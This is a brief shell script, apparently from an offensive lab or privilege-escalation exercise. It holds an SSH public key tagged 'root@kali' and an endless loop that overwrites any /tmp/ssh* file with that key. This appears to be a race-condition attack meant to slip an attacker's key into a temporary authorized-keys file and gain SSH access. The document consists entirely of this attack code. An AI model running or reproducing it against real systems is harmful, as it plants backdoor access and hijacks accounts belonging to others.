key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNdBmHAP17wDTezy2e0NhQ+kowbUGzcEfPGNdToz8jQDRkEw4pUMcLjX+1ShChfmJ/JsvOoPmVrtMibyIHv9gJkfTQdzGrm5HCtCvWAjkSeH9R0Z4ts/tH2Go7pO3MKwVhlOwlyjJOYAi3fFi0Im/hBojy6iaSewNxxel5tZt6b/Z038hDhtTUMgdnQWE12bQRN7FfbNWlFibQIDU0JGcsdE/7PvjRJdrSTwZQ5tzz6aMOdZHuHqvI+XlL9iaDeeetMfRprjCMq7Jmj4ZKmK2/KyOfNNLf0FXRdhjMk8gj+cVbPfD4E8x2FbvSsZ/wWH/pwrk5z15DQCPOLkMa9avoURQSgtVmXH5ClzVRJdDcdB8lqsXqspF+T4Go8Gz5Ve48jywBffytvLPya/b9rd07nvMAJ7YRQDfXkcJIzEIgCwszkpKBnfjrTCQ4GSoPMMEqlmugj254pjot1ssZNdwiKdqAwO3hxAoE63iPR/fRLo4N2o207JqOmvPcR0rB1L0= root@kali"
while true
do
  dir=`ls /tmp/ssh*`
  echo $key > $dir
done
